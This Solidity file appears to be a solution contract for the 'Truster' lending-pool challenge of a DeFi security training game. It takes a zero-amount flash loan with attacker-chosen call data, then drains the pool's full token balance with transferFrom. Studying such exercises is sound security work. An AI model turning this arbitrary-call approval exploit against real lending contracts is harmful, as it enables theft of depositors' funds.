// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./TrusterLenderPool.sol";
import "../DamnValuableToken.sol";

contract PoolAttacker {
  TrusterLenderPool pool;
  DamnValuableToken token;

  constructor(address _pool, address _token) {
    pool = TrusterLenderPool(_pool);
    token = DamnValuableToken(_token);
  }

  function attack(bytes calldata data, address receiver) external {
    pool.flashLoan(0, address(this), address(token), data);
    token.transferFrom(address(pool), receiver, token.balanceOf(address(pool)));
  }
}